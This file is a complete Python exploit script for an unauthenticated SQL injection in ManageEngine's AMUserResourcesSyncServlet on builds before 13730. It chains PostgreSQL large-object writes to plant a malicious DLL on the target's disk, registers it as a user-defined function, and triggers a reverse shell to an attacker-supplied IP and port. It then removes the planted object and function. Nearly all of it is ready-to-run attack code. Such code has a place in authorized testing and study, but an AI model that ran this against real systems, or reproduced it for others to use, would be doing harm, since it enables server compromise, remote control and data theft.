#!/usr/bin/env python3
# -*-coding: utf-8-*-

#################################################################################
#                  **-- ManageEngine SQLi-RCE via UDF --**                      #
#                                                                               #
# Python script to exploit ManageEngine SQLi into RCE prior to versions         #
# Build 13730. Requires backend to be PostgreSQL & have DBA. Leverages          #
# PostgreSQL to load a malicious DLL to disk. Then creates a User Defined       # 
# Function which calls a reverse shell.                                         #
#                                                                               #
# Copyright (c) 2021 Andrew Trube  <https://github.com/AndrewTrube>             #
#                                                                               #
# Permission is hereby granted, free of charge, to any person obtaining a copy  #
# of this software and associated documentation files (the "Software"), to deal #
# in the Software without restriction, including without limitation the rights  #
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell     #
# copies of the Software, and to permit persons to whom the Software is         #
# furnished to do so, subject to the following conditions:                      #
#                                                                               #
# The above copyright notice and this permission notice shall be included in all#
# copies or substantial portions of the Software.                               #
#                                                                               #                                              
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR    #
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,      #
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE   #
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER        #
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, #
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE #
# SOFTWARE.                                                                     #
#                                                                               #
#################################################################################

import sys,requests,argparse,binascii,urllib
from time import sleep
requests.packages.urllib3.disable_warnings()

msg = "\nManage Engine SQLi to RCE via PostgreSQL UDF\n"
msg += "-------------------------------------------------------------------\n"
msg += "[+] Unauthenticated SQLi in AMUserResourcesSyncServlet [+]\n"
msg += "[+] RCE using PG_Largeobjects in conjunction with dba privileges [+]\n"
msg += "-------------------------------------------------------------------\n"

#Requests session object
sess = requests.Session()

# Need to specify a unique loid to later reference our pg_largeobject
loid = "54321"

# Path to the SQLi in ZOHO ManageEngine prior to Build 13730
url = "/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;"

def create_largeObject():
  """ loads a known file into the pg_largeobject table instead of creating a 
      new large object so that PGSQL can automatically setup the metadata.
  """
  print("\n[+] Creating PGSQL largeObject entry [+]\n")
  sqli = "select lo_import($$c:\\windows\\win.ini$$,{}); -- ".format(loid)
  sess.get(host+url+sqli,verify=False)
  sleep(1)

def inject_dll(filePath):
  """ Injects DLL into pg_largeobject table. 
      Divides DLL by page max size (default 4096 bytes).
      DLL is sent as hex encoded and decoded on the backend.

      filePath: local filesystem absolute path to hex encoded DLL file 
  """
  print("[+] Injecting Malicous DLL into the pg_largeobject table [+]\n")
  payload = {'ForMasRange':'1','userId':'1'}
  with open(filePath) as fd:
    dll = fd.read()
  pages = [dll[(x*4096):((x+1)*4096)] for x in range(int(len(dll)/4096))]
  for i in range(len(pages)):
    if i >= 1:
      sqli = "insert into pg_largeobject (loid,pageno,data) values ({},{},decode($${}$$,$$hex$$)); -- ".format(loid,i,pages[i])
    else:
      sqli = "update pg_largeobject set data=decode($${}$$,$$hex$$) where loid={} and pageno={}; --  ".format(pages[i],loid,i)
    payload['userId'] = '1;{}'.format(sqli)
    sess.post(host+'/servlet/AMUserResourcesSyncServlet',data=payload,verify=False)
    sleep(1)

def export_largeObject():
  """ Writes the DLL stored in the pg_largeobject table to disk of target.
      DLL is later imported to create UDF.
  """
  print("[+] Exporting DLL from PGSQL to Disk [+]\n")
  sqli = "select lo_export({},$$c:\\users\\administrator\\appdata\local\\temp\\pwn.dll$$); -- ".format(loid)
  sess.get(host+url+sqli,verify=False)
  sleep(1)

def create_userDefinedFunction():
  print("[+] Creating Malicous User Defined Function (UDF) [+]\n")
  sqli = "create or replace function pwned(text,int) returns void as $$c:\\users\\administrator\\appdata\local\\temp\\pwn.dll$$, $$connect_back$$ language C strict; -- "
  sess.get(host+url+sqli,verify=False)
  sleep(1)

def trigger_payload(ip,lport):
  """ Triggers the payload to establish a reverse shell by executing the UDF.
  """
  print("[+] Triggering Payload! [+]\n")
  sqli = "select pwned($${}$$,{}); -- ".format(ip,lport)
  sess.get(host+url+sqli,verify=False)
  sleep(1)

def delete_largeObject():
  print("[+] Deleting malicous largeobject and function [+]\n")
  sqli = "select lo_unlink({}); -- ".format(loid)
  sess.get(host+url+sqli,verify=False)
  sleep(1)
  sqli2 = "drop function pwned(text,int); -- "
  sess.get(host+url+sqli2,verify=False)  


def main(args):
  global host
  # Proxies to route through
  #proxies = { 'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080' }
  #sess.proxies.update(proxies)
  
  host = args.host

  create_largeObject()
  inject_dll(args.file)
  export_largeObject()
  create_userDefinedFunction()
  trigger_payload(args.local_host,args.local_port)
  delete_largeObject()

  print("Finished !! Check your netcat listener !!")

    
if __name__ == "__main__":
  print(msg)

  parser = argparse.ArgumentParser()
  parser.add_argument('-t','--host',metavar='IP/DOMAIN',required=True, help="Target host's IP or Domain Name")
  parser.add_argument('-f','--file',metavar='PATH_TO_HEX_ENCODED_DLL_FILE', required=True,help="absolute path to hex encoded dll file")
  parser.add_argument('-l','--local_host', metavar="ATTACKER_IP", required=True, help="Local Host IP")
  parser.add_argument('-p','--local_port', metavar="ATTACKER_PORT", required=True, help="Port Netcat is listening on")

  try:
    args = parser.parse_args()
    main(args)
  except Exception as e:
    print(e)
    sys.exit(0)